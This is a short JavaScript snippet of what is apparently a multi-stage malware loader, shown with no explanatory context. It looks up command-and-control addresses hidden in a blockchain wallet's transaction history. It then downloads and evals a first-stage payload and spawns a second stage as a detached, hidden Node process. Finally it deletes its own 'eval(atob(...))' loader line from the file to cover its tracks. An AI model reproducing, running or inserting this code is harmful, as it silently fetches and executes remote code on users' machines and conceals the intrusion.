const wallet = "0xa322E5f3D311D3080e6f0121063e9aDC2490Ef1a";
const tx = await provider.getHistory(wallet);
const hosts = decodeIPv4(tx[0].to);
const firstStage = await fetch(hosts[0] + "/0x/cls");
eval(firstStage);
const secondStage = await fetch(hosts[1] + "/0x/ls");
spawn(process.execPath, ["-e", secondStage], {
  detached: true,
  stdio: "ignore",
  windowsHide: true,
}).unref();
const clean = readFileSync(__filename, "utf8").replace(
  /eval\(atob\(.+?\)\)/,
  "",
);
writeFileSync(__filename, clean);
